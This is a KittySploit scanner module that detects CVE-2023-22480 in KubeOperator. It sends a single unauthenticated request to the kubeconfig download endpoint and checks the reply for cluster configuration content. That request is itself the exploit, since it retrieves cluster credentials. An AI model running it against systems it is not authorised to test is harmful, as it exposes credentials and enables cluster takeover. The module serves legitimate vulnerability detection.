#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""KubeOperator is an open source Kubernetes distribution focused on helping enterprises plan, deploy and operate."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'KubeOperator Foreground `kubeconfig` - File Download Detection',
        'description': 'KubeOperator is an open source Kubernetes distribution focused on helping enterprises plan, deploy and operate production-level K8s clusters. In KubeOperator versions 3.16.3 and below, API interfaces with unauthorized entities and can leak sensitive information. This vulnerability could be used to take over the cluster under certain conditions. This issue has been patched in version 3.16.4.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'kubeoperator', 'k8s', 'kubeconfig', 'exposure', 'fit2cloud', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/KubeOperator/KubeOperator/security/advisories/GHSA-jxgp-jgh3-8jc8',
            'https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/KubeOperator/KubeOperator%20kubeconfig%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20CVE-2023-22480.md?plain=1',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-22480',
            'https://github.com/KubeOperator/KubeOperator/commit/7ef42bf1c16900d13e6376f8be5ecdbfdfb44aaf',
            'https://github.com/KubeOperator/KubeOperator/releases/tag/v3.16.4',
        ],
        'cve': 'CVE-2023-22480',
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/v1/clusters/kubeconfig/k8s', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('apiVersion:', 'clusters:',)
        header_any = ('application/download',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="KubeOperator Foreground `kubeconfig` - File Download detected",
                path='/api/v1/clusters/kubeconfig/k8s',
            )
            return True
        return False

